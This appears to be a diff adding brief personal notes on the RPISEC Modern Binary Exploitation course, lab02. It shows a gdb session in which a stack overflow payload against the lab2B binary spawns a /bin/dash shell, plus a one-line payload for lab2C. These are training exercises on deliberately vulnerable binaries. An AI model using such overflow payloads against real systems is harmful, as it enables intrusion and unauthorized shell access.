@@ -1,0 +1,19 @@
+Modern Binary Exploitation (oleh RPISEC)
+=========================================
+
+*lab02
+
+febri@febri-AO725:~/MBE/src/lab02$ gdb -q lab2B
+Reading symbols from lab2B...(no debugging symbols found)...done.
+gdb-peda$ r `python -c 'print "\x41"*27+"\x43\x84\x04\x08"+"\x24\xa0\x04\x08"'`
+Starting program: /home/febri/MBE/src/lab02/lab2B `python -c 'print "\x41"*27+"\x43\x84\x04\x08"+"\x24\xa0\x04\x08"'`
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAC�$�
+[New process 8803]
+process 8803 is executing new program: /bin/dash
+[Inferior 2 (process 8803) exited normally]
+Warning: not running or target is remote
+gdb-peda$ 
+
+
+
+./lab2C `python -c 'print "\x41"*31+"\x73\x84\x04\x08"'`
